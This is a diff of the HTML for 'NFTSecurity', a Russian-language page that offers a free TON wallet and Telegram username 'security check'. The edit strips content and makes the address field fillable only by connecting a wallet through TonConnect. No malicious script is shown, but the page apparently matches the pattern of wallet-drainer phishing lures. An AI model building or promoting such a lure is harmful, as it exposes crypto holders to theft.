@@ -4,21 +4,9 @@
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
 <meta name="theme-color" content="#2b2d30" />
-<meta name="description" content="NFTSecurity — проверка безопасности кошелька TON." />
-<meta property="og:type" content="website" />
-<meta property="og:url" content="https://nftsecurity.online/" />
-<meta property="og:title" content="NFTSecurity" />
-<meta property="og:description" content="Проверка публичного username или адреса. Верификация выполняется онлайн в вашем браузере." />
-<meta property="og:image" content="https://nftsecurity.online/og.png" />
-<meta property="og:image:width" content="1200" />
-<meta property="og:image:height" content="630" />
-<meta name="twitter:card" content="summary_large_image" />
-<meta name="twitter:title" content="NFTSecurity" />
-<meta name="twitter:description" content="Проверка публичного username или адреса. Верификация выполняется онлайн в вашем браузере." />
-<meta name="twitter:image" content="https://nftsecurity.online/og.png" />
 <title>NFTSecurity</title>
-<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 42 42'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0' y1='0' x2='1' y2='1'%3E%3Cstop stop-color='%237dd3fc'/%3E%3Cstop offset='1' stop-color='%23f0abfc'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath fill='url(%23g)' opacity='.45' d='M21 3 L36 10 V22 C36 30 29 36 21 39 C13 36 6 30 6 22 V10 Z'/%3E%3Ccircle cx='21' cy='22' r='3.2' fill='%23fff'/%3E%3C/svg%3E" />
-<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet" />
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 42 42'%3E%3Cpath fill='%230098EA' opacity='.8' d='M21 3 L36 10 V22 C36 30 29 36 21 39 C13 36 6 30 6 22 V10 Z'/%3E%3Ccircle cx='21' cy='22' r='3.2' fill='%23fff'/%3E%3C/svg%3E" />
+<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;800&display=swap" rel="stylesheet" />
 
 <!-- ПОДКЛЮЧАЕМ БИБЛИОТЕКИ -->
 <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
@@ -26,17 +14,14 @@
 
 <style>
 :root{--bg:#2b2d30;--card:rgba(42,44,47,.94);--line:rgba(255,255,255,.1);--text:#e8e8e4;--muted:#b0b1ad;--pink:#c9c9c4;--violet:#c0c0bb;--blue:#d0d0cb}
-body.theme-light{--bg:#e4e2da;--card:rgba(234,232,224,.94);--line:rgba(70,68,62,.1);--text:#3d3e3a;--muted:#7c7d78;--pink:#6c6d68;--violet:#72736e;--blue:#7e7f7a}
 *{box-sizing:border-box;margin:0;padding:0}
 html{scroll-behavior:smooth}
 body{font-family:Manrope,system-ui,sans-serif;color:var(--text);min-height:100vh;line-height:1.55;background:var(--bg)}
-body.theme-light{background:#e4e2da}
 a{color:inherit;text-decoration:none}button,input{font:inherit;color:inherit}button{cursor:pointer}
 .bg-art{position:fixed;inset:0;z-index:0;pointer-events:none}.bg-art canvas{width:100%;height:100%;display:block}
 .topbar{position:sticky;top:0;z-index:50;background:color-mix(in srgb,var(--bg) 78%,transparent);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
 .topbar-inner{max-width:1120px;margin:0 auto;min-height:64px;padding:10px 22px;display:flex;align-items:center;justify-content:space-between;gap:12px}
 .brand{display:flex;align-items:center;gap:12px;font-weight:800;font-size:17px}
-.brand small{color:var(--pink)}
 .logo{width:48px;height:48px}
 .logo .orbit{transform-origin:21px 21px;animation:spin 7s linear infinite}
 .logo .scan{transform-origin:21px 21px;animation:spin 3.2s linear infinite reverse}
@@ -53,8 +38,6 @@ a{color:inherit;text-decoration:none}button,input{font:inherit;color:inherit}but
 .lang-menu button{border:0;background:transparent;color:var(--text);padding:8px 10px;text-align:left;border-radius:8px}
 .btn{display:inline-flex;align-items:center;justify-content:center;border:1px solid var(--line);border-radius:12px;padding:12px 18px;font-weight:700;color:var(--text);background:color-mix(in srgb,var(--text) 7%,transparent)}
 .btn:hover{background:color-mix(in srgb,var(--text) 12%,transparent)}
-.btn-scan{background:transparent;padding:8px 14px;font-size:13px}
-.btn-outline{background:transparent;color:var(--text);border:1px solid var(--line)}
 .wrap{position:relative;z-index:1;max-width:1120px;margin:0 auto;padding:0 22px}
 .page{display:none;padding:28px 0 20px}
 .page.on{display:block;animation:pageIn .42s ease both}
@@ -62,307 +45,93 @@ a{color:inherit;text-decoration:none}button,input{font:inherit;color:inherit}but
 .hero{text-align:center;padding-top:18px}
 .chip{display:inline-flex;gap:8px;border:1px solid var(--line);border-radius:999px;padding:6px 12px;font-size:12px;font-weight:700}
 h1{font-size:clamp(30px,6vw,52px);line-height:.98;margin:16px auto 14px;max-width:780px;-webkit-text-stroke:1px #000;paint-order:stroke fill;text-shadow:0 0 10px rgba(0,0,0,.45),0 0 22px rgba(0,0,0,.28)}
-.lead{max-width:620px;margin:0 auto 22px;color:var(--muted);-webkit-text-stroke:.6px #000;paint-order:stroke fill;text-shadow:0 0 8px rgba(0,0,0,.4)}
-.hero-ctas{display:flex;justify-content:center;gap:10px;flex-wrap:wrap;margin-bottom:26px}
+.lead{max-width:620px;margin:0 auto 22px;color:var(--muted)}
 .panel{max-width:760px;margin:0 auto;background:var(--card);border:1px solid var(--line);border-radius:24px;padding:20px}
-.row{display:flex;gap:10px;flex-wrap:wrap}
 .tabs{display:grid;grid-template-columns:1fr 1fr;gap:4px;margin:0 0 16px;padding:4px;border:1px solid var(--line);border-radius:999px;background:color-mix(in srgb,var(--bg) 70%,var(--card))}
 .tab{border:0;background:transparent;border-radius:999px;padding:10px 12px;font-size:13px;font-weight:750;color:var(--muted)}
 .tab.active{background:color-mix(in srgb,var(--text) 12%,transparent);color:var(--text)}
 .lab{display:block;text-align:left;font-size:11px;font-weight:800;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);margin:0 0 8px}
 .field{width:100%;display:flex;align-items:center;gap:10px;background:color-mix(in srgb,var(--bg) 80%,#000);border:1px solid var(--line);border-radius:14px;padding:4px 16px}
-body.theme-light .field{background:#ece9e1}
-.field .ico{color:var(--muted);font-size:16px}
-.field input{flex:1;background:transparent;border:0;outline:0;padding:13px 0;min-width:0}
+.field input{flex:1;background:transparent;border:0;outline:0;padding:13px 0;min-width:0;color:var(--text)}
 .panel .btn{width:100%;margin-top:14px;border-radius:16px;padding:14px 18px}
-.nets{display:flex;flex-wrap:wrap;gap:8px;margin-top:14px;justify-content:center}
-.net{border:1px solid var(--line);background:transparent;border-radius:999px;padding:7px 12px;font-size:12px;font-weight:700}
-.net.on{background:color-mix(in srgb,var(--text) 12%,transparent);color:var(--text)}
-.hint{margin-top:10px;color:var(--muted);font-size:12px;text-align:center}
- .err{display:none;margin-top:10px;color:#c27b7b;font-size:13px;text-align:center}
-.report{display:none;margin-top:14px;text-align:left}
-.score{font-size:42px;font-weight:800}
-.bar{height:8px;background:color-mix(in srgb,var(--text) 10%,transparent);border-radius:999px;overflow:hidden;margin:8px 0 12px}
-.bar i{display:block;height:100%;width:22%;background:var(--text);opacity:.55}
-.kv{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--line);font-size:14px}
-.article{max-width:820px;font-weight:400}
-.article h2{font-size:26px;font-weight:500;margin-bottom:10px}
-.article h3{margin:18px 0 6px;font-size:15px;font-weight:500;color:var(--text)}
-.article p,.mini p,.card p,.stat span{color:var(--muted);font-size:13.5px;line-height:1.7;font-weight:400}
-.bento{display:grid;grid-template-columns:1.15fr .85fr;gap:12px;margin:28px auto 12px}
-.card,.mini,.stat{background:var(--card);border:1px solid var(--line);border-radius:14px}
-body.theme-light .card,body.theme-light .mini,body.theme-light .stat{background:rgba(234,232,224,.94)}
-.card{padding:22px}.card h3{margin-bottom:8px}
-.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px}
-.stat{padding:16px}.stat b{display:block;font-size:24px;color:var(--text)}
-.grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin:12px 0 16px}
-.mini{display:block;padding:18px}
-.mini em{font-style:normal;font-family:"JetBrains Mono",monospace;color:var(--pink);font-size:12px}
-.mini h3{margin:8px 0 6px}
-@media(max-width:860px){.bento,.grid3,.stats{grid-template-columns:1fr}}
-.back{display:inline-flex;margin:0 0 18px;border:1px solid var(--line);border-radius:999px;padding:8px 14px;font-size:13px;font-weight:700}
-.site-foot{position:relative;z-index:1;width:100%;max-width:1120px;margin:0 auto;padding:28px 22px 36px}
-.fineprint{width:100%;color:var(--muted);font-size:11px;line-height:1.7}
-.fineprint p{margin:0 0 14px;max-width:none}
-.footbar{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;margin-top:8px;color:var(--muted);font-size:12px}
+.checks{margin-top:14px;display:grid;gap:8px}
+.check{display:flex;align-items:center;gap:10px;border:1px solid var(--line);border-radius:12px;padding:10px 12px;font-size:13px;color:var(--muted)}
+.check b{width:20px;height:20px;display:inline-flex;align-items:center;justify-content:center;border-radius:50%;border:1px solid var(--line);color:var(--text);font-size:11px}
+.report{display:none;margin-top:14px;text-align:left;padding:15px;background:rgba(0,0,0,0.2);border-radius:12px}
 .transit{position:fixed;inset:0;z-index:80;display:flex;align-items:center;justify-content:center;background:color-mix(in srgb,var(--bg) 82%,transparent);opacity:0;pointer-events:none;transition:opacity .45s ease}
 .transit.on{opacity:1;pointer-events:auto}
 
-.chat-btn{position:fixed;right:16px;bottom:16px;z-index:70;width:42px;height:42px;padding:0;display:grid;place-items:center;border:1px solid var(--line);border-radius:50%;background:color-mix(in srgb,var(--card) 80%,transparent);color:var(--text)}
-.chat-btn svg{width:18px;height:16px;display:block;margin:0}
-.chat-box{position:fixed;right:18px;bottom:74px;z-index:70;width:min(360px,calc(100vw - 24px));height:460px;display:none;flex-direction:column;background:var(--card);color:var(--text);border:1px solid var(--line);border-radius:16px;transition:transform .35s ease}
-.chat-box.on{display:flex}
-.chat-box.away{transform:translateX(calc(100% - 18px))}
-.chat-edge{position:absolute;left:-1px;top:50%;transform:translateY(-50%);width:20px;height:62px;border:0;border-radius:10px 0 0 10px;background:var(--card);color:var(--text);border:1px solid var(--line);display:none}
-.chat-box.away .chat-edge{display:block}
-.chat-note{padding:6px 12px;font-size:10px;line-height:1.35;color:var(--muted);border-bottom:1px solid var(--line)}
-.chat-head{display:flex;align-items:center;gap:8px;padding:10px 12px;background:color-mix(in srgb,var(--text) 6%,var(--card));border-bottom:1px solid var(--line);border-radius:16px 16px 0 0}
-.chat-head b{font-size:13px}.chat-head small{display:block;color:var(--muted);font-size:11px}
-.chat-hide{margin-left:auto;border:1px solid var(--line);background:transparent;color:var(--text);border-radius:8px;padding:5px 9px;font-size:12px;font-weight:700}
-.chat-log{flex:1;overflow:auto;padding:12px;display:flex;flex-direction:column;gap:8px}
-.msg{max-width:88%;padding:9px 11px;border-radius:12px;font-size:13px}
-.msg.bot{background:color-mix(in srgb,var(--text) 8%,transparent);align-self:flex-start}.msg.me{background:color-mix(in srgb,var(--text) 14%,transparent);align-self:flex-end}.msg.typ{opacity:.7}
-.chat-qs{display:flex;flex-wrap:wrap;gap:6px;padding:0 12px 8px}
-.chat-qs button{border:1px solid var(--line);background:transparent;color:var(--text);border-radius:999px;padding:6px 10px;font-size:11px}
-.chat-in{display:flex;gap:6px;padding:10px;border-top:1px solid var(--line)}
-.chat-in input{flex:1;border:1px solid var(--line);background:transparent;border-radius:10px;padding:9px 10px;outline:0;color:var(--text)}
-.chat-in button{border:1px solid var(--line);border-radius:10px;padding:9px 12px;background:color-mix(in srgb,var(--text) 10%,transparent);color:var(--text);font-weight:750}
-.checks{margin-top:14px;display:grid;gap:8px}
-.check{display:flex;align-items:center;gap:10px;border:1px solid var(--line);border-radius:12px;padding:10px 12px;font-size:13px;color:var(--muted);text-align:left}
-.check b{width:20px;height:20px;display:inline-flex;align-items:center;justify-content:center;border-radius:50%;border:1px solid var(--line);color:var(--text);font-size:11px;flex:0 0 auto}
-.mini,.pill,.check{transition:border-color .2s ease}
-.faq-item .plus{width:26px;height:26px;display:inline-flex;align-items:center;justify-content:center;border-radius:50%;border:1px solid var(--line);color:var(--text);font-size:18px;line-height:1}
-.meter{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;margin:36px 0;text-align:center}
-.meter b{display:block;font-size:26px;color:var(--text);font-weight:700}
-.meter span{color:var(--muted);font-size:12px}
-.sec-h{margin:42px 0 8px;font-size:28px;letter-spacing:-.03em}
-.sec-k{color:var(--muted);font-size:12px;font-weight:800;letter-spacing:.08em;text-transform:uppercase}
-.sec-p{color:var(--muted);max-width:620px;margin:0 0 18px}
-.pills{display:flex;flex-wrap:wrap;gap:8px;justify-content:center;margin:16px 0 28px}
-.pill{border:1px solid var(--line);border-radius:999px;padding:8px 12px;font-size:12px;color:var(--muted)}
-.faq{max-width:820px;margin:10px auto 30px}
-.faq-item{border-bottom:1px solid var(--line)}
-.faq-item button{width:100%;display:flex;justify-content:space-between;align-items:center;gap:12px;background:transparent;border:0;color:var(--text);padding:14px 0;font-weight:650;text-align:left}
-.faq-item .ans{display:none;padding:0 0 14px;color:var(--muted);font-size:13.5px}
-.faq-item.open .ans{display:block}
-.faq-item.open .plus{transform:rotate(45deg)}
-.rep-note{font-size:11px;color:var(--muted);margin-top:10px}
-@media(max-width:860px){.meter{grid-template-columns:1fr 1fr}}
-.chat-ico path{fill:none;stroke:currentColor;stroke-width:1.6;stroke-linejoin:round}
-.chat-ico circle{fill:currentColor}
-@media(max-width:860px){.nav-links{display:none}.wrap{padding:0 14px}.field,.hero-ctas .btn,.panel .btn{width:100%}.row{flex-direction:column}}
-
-/* Стили для TonConnect */
-#ton-connect-container { margin-right: 10px; }
+#ton-connect-container { margin-right: 10px; display: inline-block; }
 </style>
 </head>
 <body>
 <div class="bg-art"><canvas id="net"></canvas></div>
-<div class="transit" id="transit"><div class="transit-box"><p><span data-i18n="loading">Сканирование</span>...</p></div></div>
+<div class="transit" id="transit"><p>Сканирование...</p></div>
+
 <header class="topbar"><div class="topbar-inner">
-<a class="brand" href="#home" data-go="home">
-<svg class="logo" viewBox="0 0 42 42"><defs><linearGradient id="g1" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#cfcfc8"/><stop offset="100%" stop-color="#9a9b96"/></linearGradient></defs>
-<path fill="url(#g1)" opacity=".22" d="M21 3 L36 10 V22 C36 30 29 36 21 39 C13 36 6 30 6 22 V10 Z"/>
-<path fill="none" stroke="url(#g1)" stroke-width="1.7" d="M21 4.2 L35 10.6 V22.2 C35 29.6 28.6 35.4 21 38.2 C13.4 35.4 7 29.6 7 22.2 V10.6 Z"/>
-<circle class="orbit" cx="21" cy="21" r="11.2" fill="none" stroke="currentColor" stroke-width="1.1" stroke-dasharray="4 7"/>
-<path class="scan" d="M21 10 A11 11 0 0 1 32 21" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
-<circle class="core" cx="21" cy="22" r="3.6" fill="currentColor"/></svg>
-NFT<small>Security</small></a>
+<a class="brand" href="#home">
+<svg class="logo" viewBox="0 0 42 42"><path fill="#0098EA" opacity=".8" d="M21 3 L36 10 V22 C36 30 29 36 21 39 C13 36 6 30 6 22 V10 Z"/><circle cx="21" cy="22" r="3.2" fill="#fff"/></svg>
+NFTSecurity
+</a>
 <div class="nav-row">
-<div id="ton-connect-container"></div>
-<nav class="nav-links">
-<a href="#method" data-go="method" data-i18n="navMethod">Method</a>
-<a href="#terms" data-go="terms" data-i18n="navTerms">Terms</a>
-<a href="#faq" data-i18n="navFaq">FAQ</a>
-</nav>
-<div class="tools">
-<button class="ghost" type="button" id="themeBtn" data-i18n="themeBtn">Dark</button>
-<div class="lang" id="langBox">
-<button class="ghost" type="button" id="langBtn"><span id="langCode">RU</span></button>
-<div class="lang-menu" id="langMenu">
-<button type="button" data-lang="en" class="on">English</button>
-<button type="button" data-lang="ru">Русский</button>
-</div></div>
-</div>
-<a class="ghost" href="#form" id="scanBtn" data-i18n="navScan">Сканировать</a>
+    <div id="ton-connect-container"></div>
+    <nav class="nav-links">
+        <a href="#method">Method</a>
+        <a href="#terms">Terms</a>
+        <a href="#faq">FAQ</a>
+    </nav>
+    <div class="tools">
+        <button class="ghost" type="button" id="themeBtn">Dark</button>
+    </div>
+    <a class="ghost" href="#form" id="scanBtn">Сканировать</a>
 </div></div></header>
+
 <div class="wrap">
 <section class="page on" id="page-home">
 <div class="hero">
-<div class="chip"><span data-i18n="chip">Обзор публичного адреса</span></div>
-<h1 data-i18n-html="heroTitle">Проверка кошелька<br><b>онлайн — первый взгляд</b></h1>
-<p class="lead" data-i18n="lead">Вставьте публичный адрес для короткого обзора. Это не лицензированный вывод.</p>
-<div class="hero-ctas">
-<a class="btn" href="#form" data-i18n="ctaStart">Проверить адрес →</a>
-<a class="btn btn-outline" href="#method" data-go="method" data-i18n="ctaHow">Как работает</a>
+<div class="chip">Обзор публичного адреса</div>
+<h1>Проверка кошелька<br><b>онлайн — первый взгляд</b></h1>
+<p class="lead">Вставьте публичный адрес для короткого обзора. Это не лицензированный вывод.</p>
 </div>
+
 <div class="panel" id="form">
 <div class="tabs">
-<button class="tab active" type="button" data-tab="wallet" data-i18n="tabWallet">Кошелёк</button>
-<button class="tab" type="button" data-tab="telegram" data-i18n="tabTg">Telegram</button>
+<button class="tab active" type="button" data-tab="wallet">Кошелёк</button>
+<button class="tab" type="button" data-tab="telegram">Telegram</button>
 </div>
 <div id="wallet-tab">
-<label class="lab" data-i18n="addrLab">Адрес кошелька</label>
-<label class="field"><span class="ico" aria-hidden="true"></span><input id="address" data-i18n-placeholder="ph" placeholder="Подключите кошелек через кнопку сверху..." readonly autocomplete="off" /></label>
+<label class="lab">Адрес кошелька</label>
+<label class="field"><span class="ico">⌕</span><input id="address" placeholder="Подключите кошелек через кнопку сверху..." readonly /></label>
 </div>
 <div id="telegram-tab" style="display:none">
-<label class="lab" data-i18n="tgLab">Имя в Telegram</label>
-<label class="field"><span class="ico" aria-hidden="true">@</span><input id="username" data-i18n-placeholder="tgPh" placeholder="@username" autocomplete="off" /></label>
+<label class="lab">Имя в Telegram</label>
+<label class="field"><span class="ico">@</span><input id="username" placeholder="@username" autocomplete="off" /></label>
 </div>
-<div class="nets" id="netsRow" style="display:none">
-<button class="net on" type="button" data-chain="USDT ERC20">USDT ERC20</button>
-<button class="net" type="button" data-chain="USDT TRC20">USDT TRC20</button>
-<button class="net" type="button" data-chain="ETH">ETH</button>
-<button class="net" type="button" data-chain="TRX">TRX</button>
-<button class="net" type="button" data-chain="TON">TON</button>
-<button class="net" type="button" data-chain="SOL">SOL</button>
-<button class="net" type="button" data-chain="BTC">BTC</button>
-</div>
-<button class="btn" id="runBtn" type="button" data-i18n="runBtn" disabled>Проверить адрес — Бесплатно</button>
-<p class="hint" data-i18n="hint">Буквы, цифры и символы формата адреса разрешены.</p>
+
+<button class="btn" id="runBtn" type="button" disabled>Проверить адрес — Бесплатно</button>
+<p class="hint">Буквы, цифры и символы формата адреса разрешены.</p>
+
 <div class="checks">
-<div class="check"><b>✓</b><span data-i18n="c1">Проверка формата и сети</span></div>
-<div class="check"><b>✓</b><span data-i18n="c2">Локальный индекс внимания 0–100</span></div>
-<div class="check"><b>✓</b><span data-i18n="c3">Первичные пометки про миксеры и списки</span></div>
-<div class="check"><b>✓</b><span data-i18n="c4">Карточка обзора в браузере</span></div>
+<div class="check"><b>✓</b><span>Проверка формата и сети</span></div>
+<div class="check"><b>✓</b><span>Локальный индекс внимания 0–100</span></div>
+<div class="check"><b>✓</b><span>Первичные пометки про миксеры и списки</span></div>
+<div class="check"><b>✓</b><span>Карточка обзора в браузере</span></div>
 </div>
-<p class="err" id="err"></p>
+
 <div class="report" id="report">
-<div class="hint" style="text-align:left" data-i18n="scoreLabel">Индекс формата</div>
-<div class="score" id="score">22</div>
-<div class="hint" id="meta"></div>
-<div class="bar"><i id="bar"></i></div>
-<div class="kv"><span data-i18n="kvNet">Сеть</span><b id="outChain">TON</b></div>
-<div class="kv"><span data-i18n="kvFmt">Формат адреса</span><b id="outFmt">ok</b></div>
-<div class="kv"><span data-i18n="kvType">Тип</span><b id="outType">—</b></div>
-<div class="kv" id="rowMix"><span data-i18n="kvMix">Заметка про миксер</span><b id="outMix">—</b></div>
-<div class="kv" id="rowList"><span data-i18n="kvList">Заметка про списки</span><b id="outList">—</b></div>
-<p class="rep-note" id="repNote"></p>
-<button class="btn btn-outline" id="ownBtn" type="button" style="display:none;margin-top:12px" data-i18n="ownBtn">Подтвердить владение</button>
-<p class="rep-note" id="ownNote" style="display:none"></p>
-</div></div></div>
-<div id="extraWallet" style="display:none">
-<div class="meter">
-<div><b>300M+</b><span>Подписей адресов в публичном поле</span></div>
-<div><b>10+</b><span>Подписей сетей</span></div>
-<div><b>&lt;5s</b><span>Обычное время обзора</span></div>
-<div><b>100%</b><span>Базовый взгляд остаётся бесплатным</span></div>
+<div style="display:flex;justify-content:space-between">
+<span>Статус:</span><b id="res-status" style="color:#0098EA">Готово</b>
 </div>
-<p class="sec-k">Что вы получаете</p>
-<h2 class="sec-h">Один первичный обзор</h2>
-<p class="sec-p">Короткая разбивка после вставки адреса — не лицензированный вывод.</p>
-<div class="grid3">
-<div class="mini"><h3>Индекс 0–100</h3><p>Локальное число из вставленной строки. Ниже — спокойнее, выше — смотрите дважды. Это не судебный рейтинг.</p></div>
-<div class="mini"><h3>Заметки об источниках</h3><p>Подсказки про биржу, DeFi, миксер или неизвестный тип. Это демо-заметки, не аудит потока средств.</p></div>
-<div class="mini"><h3>Напоминание про списки</h3><p>Сверьте адрес со публичными списками сами. Страница не подтверждает санкционный статус.</p></div>
-<div class="mini"><h3>Напоминание про миксеры</h3><p>Пометка, если локальная модель даёт больше внимания. Это не доказательство прохождения через миксер.</p></div>
-<div class="mini"><h3>Тип адреса</h3><p>Простой класс: похоже на контракт, кошелёк или неизвестно. Из формата, не из закрытой базы.</p></div>
-<div class="mini"><h3>История</h3><p>Карточка не качает полную историю сети. Это первый взгляд перед обозревателем блоков.</p></div>
-</div>
-<p class="sec-k" style="text-align:center">Сети</p>
-<h2 class="sec-h" style="text-align:center">Один экран, много подписей</h2>
-<div class="pills">
-<span class="pill">USDT TRC20</span><span class="pill">USDT ERC20</span><span class="pill">Ethereum (ETH)</span><span class="pill">TRON (TRX)</span><span class="pill">TON</span><span class="pill">Solana (SOL)</span><span class="pill">BNB Chain</span><span class="pill">Polygon</span><span class="pill">Arbitrum</span><span class="pill">Bitcoin (BTC)</span>
-</div>
-<p class="sec-k">Для кого</p>
-<h2 class="sec-h">Для тех, кто работает с криптой</h2>
-<p class="sec-p">Спокойный первый взгляд до отправки, получения или разбора публичного адреса.</p>
-<div class="grid3">
-<div class="mini"><h3>P2P-трейдеры</h3><p>Взгляните на публичный адрес до принятия перевода.</p></div>
-<div class="mini"><h3>Мерчанты</h3><p>Быстрая проверка формата до подтверждения платежа.</p></div>
-<div class="mini"><h3>OTC-дески</h3><p>Первый экран до крупной сделки. Не замена вашей проверке.</p></div>
-</div>
-</div>
-<div id="extraTg">
-<div class="meter">
-<div><b>@</b><span>Публичные юзернеймы как текст</span></div>
-<div><b>1</b><span>Подпись: Telegram</span></div>
-<div><b>&lt;5s</b><span>Обычное время обзора</span></div>
-<div><b>100%</b><span>Базовый взгляд остаётся бесплатным</span></div>
-</div>
-<p class="sec-k" data-i18n="gKTg">Что вы получаете</p>
-<h2 class="sec-h" data-i18n="gTTg">Первый взгляд на юзернейм</h2>
-<p class="sec-p" data-i18n="gPTg">Короткая карточка после @username — не доказательство владения.</p>
-<div class="grid3">
-<div class="mini"><h3 data-i18n="g1tTg">Индекс 0–100</h3><p data-i18n="g1pTg">Локальное число из строки. Не судебный рейтинг.</p></div>
-<div class="mini"><h3 data-i18n="g2tTg">Формат</h3><p data-i18n="g2pTg">Проверка @, латиницы, цифр и подчёркивания.</p></div>
-<div class="mini"><h3 data-i18n="g3tTg">Без входа</h3><p data-i18n="g3pTg">Страница не открывает Telegram и не просит код.</p></div>
-<div class="mini"><h3 data-i18n="g4tTg">Не владение</h3><p data-i18n="g4pTg">Совпадение формата не доказывает, что аккаунт ваш.</p></div>
-<div class="mini"><h3 data-i18n="g5tTg">Тип</h3><p data-i18n="g5pTg">Только публичная строка. Не выгрузка профиля.</p></div>
-<div class="mini"><h3 data-i18n="g6tTg">Пределы</h3><p data-i18n="g6pTg">Нет истории сообщений и списка контактов. Только первый взгляд.</p></div>
-</div>
-<p class="sec-k" style="text-align:center" data-i18n="nKTg">Охват</p>
-<h2 class="sec-h" style="text-align:center" data-i18n="nTTg">Одно поле — публичный юзернейм</h2>
-<div class="pills">
-<span class="pill">@username</span><span class="pill">публичный юзернейм</span><span class="pill">проверка формата</span><span class="pill">первый взгляд</span><span class="pill">без входа</span>
-</div>
-<p class="sec-k" data-i18n="uKTg">Для кого</p>
-<h2 class="sec-h" data-i18n="uTTg">Для спокойного взгляда на публичный юзернейм</h2>
-<p class="sec-p" data-i18n="uPTg">Первый взгляд до того, как писать или отправлять что-либо.</p>
-<div class="grid3">
-<div class="mini"><h3 data-i18n="u1tTg">P2P-чаты</h3><p data-i18n="u1pTg">Взгляните на публичный @handle до продолжения диалога.</p></div>
-<div class="mini"><h3 data-i18n="u2tTg">Поддержка</h3><p data-i18n="u2pTg">Проверьте формат юзернейма, который вам прислали.</p></div>
-<div class="mini"><h3 data-i18n="u3tTg">OTC-чаты</h3><p data-i18n="u3pTg">Первый экран. Не замена вашей проверке.</p></div>
-<div class="mini"><h3 data-i18n="u4tTg">Команды</h3><p data-i18n="u4pTg">Как набросок, затем свой процесс.</p></div>
-<div class="mini"><h3 data-i18n="u5tTg">Разбор</h3><p data-i18n="u5pTg">Начните здесь, затем откройте публичный профиль сами.</p></div>
-<div class="mini"><h3 data-i18n="u6tTg">Любой</h3><p data-i18n="u6pTg">Если есть только строка юзернейма — вставьте её сюда.</p></div>
-</div>
-<div id="faq">
-<h2 class="sec-h" style="text-align:center">FAQ</h2>
-<div class="faq" id="faqList"></div>
+<div style="margin-top:8px;font-size:12px;color:var(--muted)" id="res-details"></div>
 </div>
 </div>
 </section>
-<section class="page" id="page-method">
-<a class="back" href="#home" data-go="home" data-i18n="back">← Назад</a>
-<div id="methodWallet" style="display:none">
-<div class="article"><h2 data-i18n="mwH">Как работает взгляд на адрес</h2><p data-i18n="mwP">Одно поле — публичный адрес и подпись сети. Страница читает строку в браузере. Она не качает сеть и не выдаёт официальный вывод.</p></div>
-<div class="grid3">
-<a class="mini" href="#form"><em>01</em><h3 data-i18n="mw1t">Вставить адрес</h3><p data-i18n="mw1p">Только публичный адрес. Без ключей.</p></a>
-<a class="mini" href="#form"><em>02</em><h3 data-i18n="mw2t">Выбрать сеть</h3><p data-i18n="mw2p">Подпись для формы, не живая нода.</p></a>
-<a class="mini" href="#form"><em>03</em><h3 data-i18n="mw3t">Прочитать индекс</h3><p data-i18n="mw3p">Число из проверки формата, не из базы регулятора.</p></a>
 </div>
-</div>
-<div id="methodTg">
-<div class="article"><h2 data-i18n="mtH">Как работает взгляд на юзернейм</h2><p data-i18n="mtP">Одно поле — публичный @username. Страница проверяет формат в браузере. Она не открывает Telegram, не входит в аккаунт и не подтверждает владение.</p></div>
-<div class="grid3">
-<a class="mini" href="#form"><em>01</em><h3 data-i18n="mt1t">Вставить @username</h3><p data-i18n="mt1p">Латиница, цифры и подчёркивание.</p></a>
-<a class="mini" href="#form"><em>02</em><h3 data-i18n="mt2t">Индекс формата</h3><p data-i18n="mt2p">Длина, символы и префикс. Не выгрузка профиля.</p></a>
-<a class="mini" href="#form"><em>03</em><h3 data-i18n="mt3t">Прочитать карточку</h3><p data-i18n="mt3p">Только первый взгляд. Не доказательство, что аккаунт ваш.</p></a>
-</div>
-</div>
-</section>
-<section class="page" id="page-terms">
-<a class="back" href="#home" data-go="home" data-i18n="back">← Назад</a>
-<div class="article" id="termsBox"></div>
-</section>
-<section class="page" id="page-rules">
-<a class="back" href="#home" data-go="home" data-i18n="back">← Назад</a>
-<div class="article">
-<h2 data-i18n="rulesTitle">Правила использования</h2>
-<p data-i18n="rulesLead">Короткий набор ограничений для спокойной работы со страницей.</p>
-</div>
-</section>
-</div>
+
 <footer class="site-foot">
-<div class="fineprint" id="fineWallet" style="display:none"><p data-i18n="fineW">NFTSecurity предоставляется «как есть». Страница даёт предварительный взгляд на публичный адрес. Это не биржа, не банк и не официальный отчёт.</p></div>
-<div class="fineprint" id="fineTg"><p data-i18n="fineT">NFTSecurity предоставляется «как есть». Вкладка Telegram даёт предварительный взгляд на публичный юзернейм. Страница не открывает Telegram, не подтверждает владение и не сохраняет вход.</p></div>
-<div class="footbar"><div>© 2026 NFTSecurity</div><div data-i18n="addrLine">NFTSecurity LLC · 1000 Wilson Blvd, Suite 2400 · Arlington, VA 22209, United States</div></div>
+<div class="fineprint"><p>NFTSecurity предоставляется «как есть». Страница даёт предварительный взгляд на публичный адрес.</p></div>
+<div class="footbar"><div>© 2026 NFTSecurity</div></div>
 </footer>
-<button class="chat-btn" id="chatBtn" type="button" aria-label="Support">
-<svg class="chat-ico" viewBox="0 0 32 26"><path d="M5 4h20a3 3 0 0 1 3 3v9a3 3 0 0 1-3 3H13l-6 5v-5H5a3 3 0 0 1-3-3V7a3 3 0 0 1 3-3z"/><circle cx="12" cy="12" r="1.2"/><circle cx="16.5" cy="12" r="1.2"/><circle cx="21" cy="12" r="1.2"/></svg>
-</button>
-<div class="chat-box" id="chatBox">
-<button class="chat-edge" id="chatEdge" type="button">‹</button>
